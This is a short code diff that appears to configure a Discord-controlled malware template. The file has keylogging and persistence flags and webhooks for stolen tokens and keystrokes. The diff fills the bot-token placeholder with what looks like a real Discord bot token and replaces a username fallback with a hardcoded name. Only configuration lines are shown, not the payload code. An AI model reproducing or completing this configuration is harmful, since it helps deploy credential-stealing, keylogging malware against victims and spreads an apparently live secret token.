@@ -33,7 +33,7 @@ VERSION = "v1.1.9"
 KEYLOG = {KEYLOG}
 PERSISTENT = {PERSISTENT}
 
-BOT_TOKEN = "{BOT_TOKEN}"
+BOT_TOKEN = "{OTg5NTQ4MTI1ODUxMTE5Njg3.GuGnWO.BO_NzkhehAukWcFlh7ZgWxxyOB-U_nycxQYco0}"
 TOKEN_WEBHOOK = "{TOKEN_WEBHOOK}"
 KEYLOGGER_WEBHOOK = "{KEYLOGGER_WEBHOOK}"
 
@@ -94,7 +94,7 @@ def getUsername():
     try:
         USERNAME = os.getlogin()
     except Exception as e:
-        USERNAME = "None"
+        USERNAME = "Lina.luvs_roblox"
     return USERNAME
 
 def getOS():
